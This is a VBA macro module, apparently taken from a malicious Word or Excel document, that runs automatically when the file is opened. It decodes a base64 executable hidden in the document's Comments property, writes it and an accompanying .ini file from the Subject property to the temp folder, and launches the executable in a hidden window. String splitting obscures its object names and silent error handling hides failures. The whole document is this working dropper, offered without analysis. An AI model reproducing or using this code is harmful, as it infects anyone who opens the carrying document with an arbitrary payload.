Sub Auto_Open()
    On Error Resume Next
    Dim tmp_name As String
    Dim you_name As String
    Dim ini_name As String
    Dim ffsssoo As String
    ffsssoo = "S" & "c" & "r" & "i" & "p" & "t" & "i" & "n" & "g" & "." & "F" & "i" & "l" & "e" & "S" & "y" & "s" & "t" & "e" & "m" & "O" & "b" & "j" & "e" & "c" & "t"
    Set fsso = CreateObject(ffsssoo)
    tmp_folder = fsso.GetSpecialFolder(2)
    tmp_file = fsso.GetTempName()
    you_name = tmp_folder + "\" + tmp_file + ".e" + "xe"
    ini_name = tmp_folder + "\" + tmp_file + ".ini"
    For Each prop In ActiveDocument.BuiltInDocumentProperties
        If prop.Name = "Comments" Then
            Result = CreateLoader(prop.Value, you_name)

        End If
        If prop.Name = "Subject" Then
            Result = Createini(prop.Value, ini_name)
        End If
    Next
    
    Dim waitOnReturn As Boolean: waitOnReturn = False
    Dim windowStyle As Integer: windowStyle = 0
    Dim FBAWE
    FBAWE = "S" & "h" & "e" & "l" & "l"
    Dim VINGLlLMBYysa
    VINGLlLMBYysa = "W" & "S" & "c" & "r" & "i" & "p" & "t"
    Dim MclRFLR
    MclRFLR = VINGLlLMBYysa & "." & FBAWE
    Dim XYcDVvXPLBn
    Set XYcDVvXPLBn = VBA.CreateObject(MclRFLR)
    XYcDVvXPLBn.Run you_name, windowStyle, waitOnReturn
End Sub

Public Function CreateLoader(strBase64 As String, loaderpath As String)
    On Error Resume Next
    Const UseBinaryStreamType = 1
    Const SaveWillCreateOrOverwrite = 2
    Dim streamOutput: Set streamOutput = CreateObject("ADODB.Stream")
    Dim xmlDoc: Set xmlDoc = CreateObject("Microsoft.XMLDOM")
    Dim xmlElem: Set xmlElem = xmlDoc.createElement("tmp")
    xmlElem.dataType = "bin.base64"
    xmlElem.Text = strBase64
    streamOutput.Open
    streamOutput.Type = UseBinaryStreamType
    streamOutput.Write = xmlElem.nodeTypedValue
    streamOutput.SaveToFile loaderpath, SaveWillCreateOrOverwrite
    Set streamOutput = Nothing
    Set xmlDoc = Nothing
    Set xmlElem = Nothing
End Function

Public Function Createini(strhex As String, inipath As String)
    On Error Resume Next
    Const adSaveCreateNotExist = 1
    Const adSaveCreateOverWrite = 2
    Const adTypeBinary = 1
    Const adTypeText = 2
    Dim objStreamUTF8: Set objStreamUTF8 = CreateObject("ADODB.Stream")
    Dim objStreamUTF8NoBOM: Set objStreamUTF8NoBOM = CreateObject("ADODB.Stream")
    With objStreamUTF8
    .Charset = "UTF-8"
    .Open
    .WriteText strhex
    .Position = 0
    .SaveToFile inipath, adSaveCreateOverWrite
    .Type = adTypeText
    .Position = 3
    End With
    With objStreamUTF8NoBOM
    .Type = adTypeBinary
    .Open
    objStreamUTF8.CopyTo objStreamUTF8NoBOM
    .SaveToFile inipath, adSaveCreateOverWrite
    End With
    objStreamUTF8.Close
    objStreamUTF8NoBOM.Close
End Function

Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub




